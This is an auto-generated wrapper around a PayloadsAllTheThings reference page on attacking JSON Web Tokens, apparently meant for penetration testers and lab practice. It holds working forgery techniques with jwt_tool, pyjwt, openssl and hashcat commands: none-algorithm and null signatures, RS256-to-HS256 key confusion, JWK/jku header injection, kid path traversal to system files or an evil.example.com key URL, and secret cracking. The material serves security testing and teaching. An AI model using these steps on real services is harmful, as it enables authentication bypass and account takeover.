---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# JWT - JSON Web Token

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-json-web-token-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/JSON Web Token/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [JWT - JSON Web Token](../../topics/json-web-token/jwt-json-web-token.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-json-web-token-readme |
| name | JWT - JSON Web Token |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md |

## Preserved Source Material

````yaml
_body: "# JWT - JSON Web Token\n\n> JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained\
  \ way for securely transmitting information between parties as a JSON object. This information can be verified and trusted\
  \ because it is digitally signed.\n\n## Summary\n\n- [Tools](#tools)\n- [JWT Format](#jwt-format)\n    - [Header](#header)\n\
  \    - [Payload](#payload)\n- [JWT Signature](#jwt-signature)\n    - [JWT Signature - Null Signature Attack (CVE-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)\n\
  \    - [JWT Signature - Disclosure of a correct signature (CVE-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)\n\
  \    - [JWT Signature - None Algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)\n    - [JWT Signature\
  \ - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)](#jwt-signature---key-confusion-attack-rs256-to-hs256-cve-2016-5431)\n\
  \    - [JWT Signature - Key Injection Attack (CVE-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)\n   \
  \ - [JWT Signature - Recover Public Key From Signed JWTs](#jwt-signature---recover-public-key-from-signed-jwts)\n- [JWT\
  \ Secret](#jwt-secret)\n    - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)\n    - [Break\
  \ JWT secret](#break-jwt-secret)\n- [JWT Claims](#jwt-claims)\n    - [JWT kid Claim Misuse](#jwt-kid-claim-misuse)\n   \
  \ - [JWKS - jku header injection](#jwks---jku-header-injection)\n- [Labs](#labs)\n- [References](#references)\n\n## Tools\n\
  \n- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) -  \U0001F40D A toolkit for testing, tweaking and cracking JSON\
  \ Web Tokens\n- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - JWT brute force cracker written\
  \ in C\n- [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - JavaScript Object Signing\
  \ and Encryption Pentesting Helper\n- [jwt.io](https://jwt.io/) - Encoder/Decoder\n\n## JWT Format\n\nJSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`\n\
  \nExample : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`\n\
  \nWhere we can split it into 3 components separated by a dot.\n\n```powershell\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   \
  \     # header\neyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload\nUL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature\n\
  ```\n\n### Header\n\nRegistered header parameter names defined in [JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515).\n\
  The most basic JWT header is the following JSON.\n\n```json\n{\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\"\n}\n```\n\n\
  Other parameters are registered in the RFC.\n\n| Parameter | Definition                           | Description |\n|-----------|--------------------------------------|-------------|\n\
  | alg       | Algorithm                            | Identifies the cryptographic algorithm used to secure the JWS |\n|\
  \ jku       | JWK Set URL                          | Refers to a resource for a set of JSON-encoded public keys    |\n|\
  \ jwk       | JSON Web Key                         | The public key used to digitally sign the JWS                 |\n|\
  \ kid       | Key ID                               | The key used to secure the JWS                                |\n|\
  \ x5u       | X.509 URL                            | URL for the X.509 public key certificate or certificate chain |\n|\
  \ x5c       | X.509 Certificate Chain              | X.509 public key certificate or certificate chain in PEM-encoded used\
  \ to digitally sign the JWS |\n| x5t       | X.509 Certificate SHA-1 Thumbprint)  | Base64 url-encoded SHA-1 thumbprint\
  \ (digest) of the DER encoding of the X.509 certificate       |\n| x5t#S256  | X.509 Certificate SHA-256 Thumbprint | Base64\
  \ url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate     |\n| typ       | Type       \
  \                          | Media Type. Usually `JWT` |\n| cty       | Content Type                         | This header\
  \ parameter is not recommended to use |\n| crit      | Critical                             | Extensions and/or JWA are\
  \ being used |\n\nDefault algorithm is \"HS256\" (HMAC SHA256 symmetric encryption).\n\"RS256\" is used for asymmetric purposes\
  \ (RSA asymmetric encryption and private key signature).\n\n| `alg` Param Value  | Digital Signature or MAC Algorithm |\
  \ Requirements |\n|-------|------------------------------------------------|---------------|\n| HS256 | HMAC using SHA-256\
  \                             | Required      |\n| HS384 | HMAC using SHA-384                             | Optional   \
  \   |\n| HS512 | HMAC using SHA-512                             | Optional      |\n| RS256 | RSASSA-PKCS1-v1_5 using SHA-256\
  \                | Recommended   |\n| RS384 | RSASSA-PKCS1-v1_5 using SHA-384                | Optional      |\n| RS512\
  \ | RSASSA-PKCS1-v1_5 using SHA-512                | Optional      |\n| ES256 | ECDSA using P-256 and SHA-256          \
  \        | Recommended   |\n| ES384 | ECDSA using P-384 and SHA-384                  | Optional      |\n| ES512 | ECDSA\
  \ using P-521 and SHA-512                  | Optional      |\n| PS256 | RSASSA-PSS using SHA-256 and MGF1 with SHA-256 |\
  \ Optional      |\n| PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 | Optional      |\n| PS512 | RSASSA-PSS using\
  \ SHA-512 and MGF1 with SHA-512 | Optional      |\n| none | No digital signature or MAC performed          | Required  \
  \    |\n\nInject headers with [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): `python3 jwt_tool.py JWT_HERE -I\
  \ -hc header1 -hv testval1 -hc header2 -hv testval2`\n\n### Payload\n\n```json\n{\n    \"sub\":\"1234567890\",\n    \"name\"\
  :\"Amazing Haxx0r\",\n    \"exp\":\"1466270722\",\n    \"admin\":true\n}\n```\n\nClaims are the predefined keys and their\
  \ values:\n\n- iss: issuer of the token\n- exp: the expiration timestamp (reject tokens which have expired). Note: as defined\
  \ in the spec, this must be in seconds.\n- iat: The time the JWT was issued. Can be used to determine the age of the JWT\n\
  - nbf: \"not before\" is a future time when the token will become active.\n- jti: unique identifier for the JWT. Used to\
  \ prevent the JWT from being re-used or replayed.\n- sub: subject of the token (rarely used)\n- aud: audience of the token\
  \ (also rarely used)\n\nInject payload claims with [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): `python3 jwt_tool.py\
  \ JWT_HERE -I -pc payload1 -pv testval3`\n\n## JWT Signature\n\n### JWT Signature - Null Signature Attack (CVE-2020-28042)\n\
  \nSend a JWT with HS256 algorithm without a signature like `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`\n\
  \n**Exploit**:\n\n```ps1\npython3 jwt_tool.py JWT_HERE -X n\n```\n\n**Deconstructed**:\n\n```json\n{\"alg\":\"HS256\",\"\
  typ\":\"JWT\"}.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}\n```\n\n### JWT Signature - Disclosure\
  \ of a correct signature (CVE-2019-7644)\n\nSend a JWT with an incorrect signature, the endpoint might respond with an error\
  \ disclosing the correct one.\n\n- [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with\
  \ each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)\n- [CVE-2019-7644: Security Vulnerability\
  \ in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)\n\n```ps1\n\
  Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs\n\
  Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=\n\
  ```\n\n### JWT Signature - None Algorithm (CVE-2015-9235)\n\nJWT supports a `None` algorithm for signature. This was probably\
  \ introduced to debug applications. However, this can have a severe impact on the security of the application.\n\nNone algorithm\
  \ variants:\n\n- `none`\n- `None`\n- `NONE`\n- `nOnE`\n\nTo exploit this vulnerability, you just need to decode the JWT\
  \ and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you\
  \ **remove** the signature\n\nAlternatively you can modify an existing JWT (be careful with the expiration time)\n\n- Using\
  \ [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)\n\n    ```ps1\n    python3 jwt_tool.py [JWT_HERE] -X a\n    ```\n\
  \n- Manually editing the JWT\n\n    ```python\n    import jwt\n\n    jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'\n\
  \    decodedToken = jwt.decode(jwtToken, verify=False)       \n\n    # decode the token before encoding with type 'None'\n\
  \    noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)\n\n    print(noneEncoded.decode())\n    ```\n\n### JWT\
  \ Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)\n\nIf a server’s code is expecting a token with \"alg\"\
  \ set to RSA, but receives a token with \"alg\" set to HMAC, it may inadvertently use the public key as the HMAC symmetric\
  \ key when verifying the signature.\n\nBecause the public key can sometimes be obtained by the attacker, the attacker can\
  \ modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use\
  \ the same RSA key pair as their TLS web server: `openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`\n\
  \n> The algorithm **HS256** uses the secret key to sign and verify each message.\n> The algorithm **RS256** uses the private\
  \ key to sign the message and uses the public key for authentication.\n\n```python\nimport jwt\npublic = open('public.pem',\
  \ 'r').read()\nprint public\nprint jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256')\n```\n\n:warning: This\
  \ behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key\
  \ is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following\
  \ version: `pip install pyjwt==0.4.3`.\n\n- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)\n\n    ```ps1\n\
  \    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem\n    ```\n\n- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)\n\
  \    1. Find the public key, usually in `/jwks.json` or `/.well-known/jwks.json`\n    2. Load it in the JWT Editor Keys\
  \ tab, click `New RSA Key`.\n    3. . In the dialog, paste the JWK that you obtained earlier: `{\"kty\":\"RSA\",\"e\":\"\
  AQAB\",\"use\":\"sig\",\"kid\":\"961a...85ce\",\"alg\":\"RS256\",\"n\":\"16aflvW6...UGLQ\"}`\n    4. Select the PEM radio\
  \ button and copy the resulting PEM key.\n    5. Go to the Decoder tab and Base64-encode the PEM.\n    6. Go back to the\
  \ JWT Editor Keys tab and generate a `New Symmetric Key` in JWK format.\n    7. Replace the generated value for the k parameter\
  \ with a Base64-encoded PEM key that you just copied.\n    8. Edit the JWT token alg to `HS256` and the data.\n    9. Click\
  \ `Sign` and keep the option: `Don't modify header`\n\n- Manually using the following steps to edit an RS256 JWT token into\
  \ an HS256\n    1. Convert our public key (key.pem) into HEX with this command.\n\n        ```powershell\n        $ cat\
  \ key.pem | xxd -p | tr -d \"\\\\n\"\n        2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a\n        ```\n\n    2. Generate\
  \ HMAC signature by supplying our public key as ASCII hex and with our token previously edited.\n\n        ```powershell\n\
  \        $ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ\" |\
  \ openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a\n\n        (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0\n\
  \        ```\n\n    3. Convert signature (Hex to \"base64 URL\")\n\n        ```powershell\n        python2 -c \"exec(\\\"\
  import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\\\
  \")\"\n        ```\n\n    4. Add signature to edited payload\n\n        ```powershell\n        [HEADER EDITED RS256 TO HS256].[DATA\
  \ EDITED].[SIGNATURE]\n        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA\n\
  \        ```\n\n### JWT Signature - Key Injection Attack (CVE-2018-0114)\n\n> A vulnerability in the Cisco node-jose open\
  \ source library before 0.11.0 could allow an unauthenticated, remote attacker to re-sign tokens using a key that is embedded\
  \ within the token. The vulnerability is due to node-jose following the JSON Web Signature (JWS) standard for JSON Web Tokens\
  \ (JWTs). This standard specifies that a JSON Web Key (JWK) representing a public key can be embedded within the header\
  \ of a JWS. This public key is then trusted for verification. An attacker could exploit this by forging valid JWS objects\
  \ by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned)\
  \ private key associated with the public key embedded in that JWS header.\n\n**Exploit**:\n\n- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)\n\
  \n    ```ps1\n    python3 jwt_tool.py [JWT_HERE] -X i\n    ```\n\n- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)\n\
  \    1. Add a `New RSA key`\n    2. In the JWT's Repeater tab, edit data\n    3. `Attack` > `Embedded JWK`\n\n**Deconstructed**:\n\
  \n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\"\
  ,\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\
  \n  }\n}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key injected]\n```\n\n### JWT Signature - Recover\
  \ Public Key From Signed JWTs\n\nThe RS256, RS384 and RS512 algorithms use RSA with PKCS#1 v1.5 padding as their signature\
  \ scheme. This has the property that you can compute the public key given two different messages and accompanying signatures.\n\
  \n[SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): compute an RSA public key from two signed JWTs\n\n```ps1\n\
  $ docker run -it ttervoort/jws2pubkey JWS1 JWS2\n$ docker run -it ttervoort/jws2pubkey \"$(cat sample-jws/sample1.txt)\"\
  \ \"$(cat sample-jws/sample2.txt)\" | tee pubkey.jwk\nComputing public key. This may take a minute...\n{\"kty\": \"RSA\"\
  , \"n\": \"sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ\"\
  , \"e\": \"AQAB\"}\n```\n\n## JWT Secret\n\n> To create a JWT, a secret key is used to sign the header and payload, which\
  \ generates the signature. The secret key must be kept secret and secure to prevent unauthorized access to the JWT or tampering\
  \ with its contents. If an attacker is able to access the secret key, they can create, modify or sign their own tokens,\
  \ bypassing the intended security controls.\n\n### Encode and Decode JWT with the secret\n\n- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool):\n\
  \n    ```ps1\n    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds\n\
  \    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds\
  \ -T\n    \n    Token header values:\n    [+] alg = \"HS256\"\n    [+] typ = \"JWT\"\n\n    Token payload values:\n    [+]\
  \ name = \"John Doe\"\n    ```\n\n- Using [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`\n\n    ```python\n\
  \    import jwt\n    encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')\n    jwt.decode(encoded, 'secret',\
  \ algorithms=['HS256']) \n    ```\n\n### Break JWT secret\n\nUseful list of 3502 public-available JWT: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list),\
  \ including `your_jwt_secret`, `change_this_super_secret_random_string`, etc.\n\n#### JWT tool\n\nFirst, bruteforce the\
  \ \"secret\" key used to compute the signature using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)\n\n```powershell\n\
  python3 -m pip install termcolor cprint pycryptodomex requests\npython3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI\
  \ -d /tmp/wordlist -C\n```\n\nThen edit the field inside the JSON Web Token.\n\n```powershell\nCurrent value of role is:\
  \ user\nPlease enter new value and hit ENTER\n> admin\n[1] sub = 1234567890\n[2] role = admin\n[3] iat = 1516239022\n[0]\
  \ Continue to next step\n\nPlease select a field number (or 0 to Continue):\n> 0\n```\n\nFinally, finish the token by signing\
  \ it with the previously retrieved \"secret\" key.\n\n```powershell\nToken Signing:\n[1] Sign token with known key\n[2]\
  \ Strip signature from token vulnerable to CVE-2015-2951\n[3] Sign with Public Key bypass vulnerability\n[4] Sign token\
  \ with key file\n\nPlease select an option from above (1-4):\n> 1\n\nPlease enter the known key:\n> secret\n\nPlease enter\
  \ the key length:\n[1] HMAC-SHA256\n[2] HMAC-SHA384\n[3] HMAC-SHA512\n> 1\n\nYour new forged token:\n[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic\n\
  [+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic\n\
  ```\n\n- Recon: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`\n\
  - Scanning: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\"\
  \ -M pb`\n- Exploitation: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\"\
  \ -X i -I -pc name -pv admin`\n- Fuzzing: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\"\
  \ -I -hc kid -hv custom_sqli_vectors.txt`\n- Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\"\
  \ -X i -I -pc name -pv admin`\n\n#### Hashcat\n\n> Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on\
  \ a single GTX1080 - [src](https://twitter.com/hashcat/status/955154646494040065)\n\n- Dictionary attack: `hashcat -a 0\
  \ -m 16500 jwt.txt wordlist.txt`\n- Rule-based attack: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`\n\
  - Brute force attack: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`\n\n## JWT Claims\n\n[IANA's\
  \ JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)\n\n### JWT kid Claim Misuse\n\nThe \"kid\" (key\
  \ ID) claim in a JSON Web Token (JWT) is an optional header parameter that is used to indicate the identifier of the cryptographic\
  \ key that was used to sign or encrypt the JWT. It is important to note that the key identifier itself does not provide\
  \ any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of\
  \ the JWT.\n\n- Example #1 : Local file\n\n    ```json\n    {\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\",\n    \"kid\"\
  : \"/root/res/keys/secret.key\"\n    }\n    ```\n\n- Example #2 : Remote file\n\n    ```json\n    {\n        \"alg\":\"\
  RS256\",\n        \"typ\":\"JWT\",\n        \"kid\":\"http://localhost:7070/privKey.key\"\n    }\n    ```\n\nThe content\
  \ of the file specified in the kid header will be used to generate the signature.\n\n```js\n// Example for HS256\nHMACSHA256(\n\
  \  base64UrlEncode(header) + \".\" +\n  base64UrlEncode(payload),\n  your-256-bit-secret-from-secret.key\n)\n```\n\nThe\
  \ common ways to misuse the kid header:\n\n- Get the key content to change the payload\n- Change the key path to force your\
  \ own\n\n    ```py\n    >>> jwt.encode(\n    ...     {\"some\": \"payload\"},\n    ...     \"secret\",\n    ...     algorithm=\"\
  HS256\",\n    ...     headers={\"kid\": \"http://evil.example.com/custom.key\"},\n    ... )\n    ```\n\n- Change the key\
  \ path to a file with a predictable content.\n\n  ```ps1\n  python3 jwt_tool.py <JWT> -I -hc kid -hv \"../../dev/null\"\
  \ -S hs256 -p \"\"\n  python3 jwt_tool.py <JWT> -I -hc kid -hv \"/proc/sys/kernel/randomize_va_space\" -S hs256 -p \"2\"\
  \n  ```\n\n- Modify the kid header to attempt SQL and Command Injections\n\n### JWKS - jku header injection\n\n\"jku\" header\
  \ value points to the URL of the JWKS file. By replacing the \"jku\" URL with an attacker-controlled URL containing the\
  \ Public Key, an attacker can use the paired Private Key to sign the token and let the service retrieve the malicious Public\
  \ Key and verify the token.\n\nIt is sometimes exposed publicly via a standard endpoint:\n\n- `/jwks.json`\n- `/.well-known/jwks.json`\n\
  - `/openid/connect/jwks.json`\n- `/api/keys`\n- `/api/v1/keys`\n- [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)\n\
  \nYou should create your own key pair for this attack and host it. It should look like that:\n\n```json\n{\n    \"keys\"\
  : [\n        {\n            \"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",\n            \"kty\": \"RSA\",\n        \
  \    \"e\": \"AQAB\",\n            \"n\": \"nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ\"\n        }\n    ]\n}\n```\n\n**Exploit**:\n\
  \n- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)\n\n    ```ps1\n    python3 jwt_tool.py JWT_HERE -X s\n\
  \    python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json\n    ```\n\n- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)\n\
  \    1. Generate a new RSA key and host it\n    2. Edit JWT's data\n    3. Replace the `kid` header with the one from your\
  \ JWKS\n    4. Add a `jku` header and sign the JWT (`Don't modify header` option should be checked)\n\n**Deconstructed**:\n\
  \n```json\n{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.\n{\"\
  login\":\"admin\"}.\n[Signed with new Private key; Public key exported]\n```\n\n## Labs\n\n- [PortSwigger - JWT authentication\
  \ bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)\n\
  - [PortSwigger - JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)\n\
  - [PortSwigger - JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)\n\
  - [PortSwigger - JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)\n\
  - [PortSwigger - JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)\n\
  - [PortSwigger - JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)\n\
  - [Root Me - JWT - Introduction](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Introduction)\n- [Root Me - JWT -\
  \ Revoked token](https://www.root-me.org/en/Challenges/Web-Server/JWT-Revoked-token)\n- [Root Me - JWT - Weak secret](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)\n\
  - [Root Me - JWT - Unsecure File Signature](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)\n\
  - [Root Me - JWT - Public key](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)\n- [Root Me - JWT - Header\
  \ Injection](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)\n- [Root Me - JWT - Unsecure Key Handling](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)\n\
  \n## References\n\n- [5 Easy Steps to Understanding JSON Web Token - Shaurya Sharma - December 21, 2019](https://web.archive.org/web/20210218162416/https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)\n\
  - [Attacking JWT authentication - Sjoerd Langkemper - September 28, 2016](https://web.archive.org/web/20251102094325/https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)\n\
  - [Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid - February 23, 2023](https://web.archive.org/web/20250914204544/https://www.youtube.com/watch?v=d7wmUz57Nlg)\n\
  - [Critical vulnerabilities in JSON Web Token libraries - Tim McLean - March 31, 2015](https://web.archive.org/web/20260207024257/https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)\n\
  - [Hacking JSON Web Token (JWT) - pwnzzzz - May 3, 2018](https://web.archive.org/web/20180509012007/https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)\n\
  - [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify - February 9, 2017](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)\n\
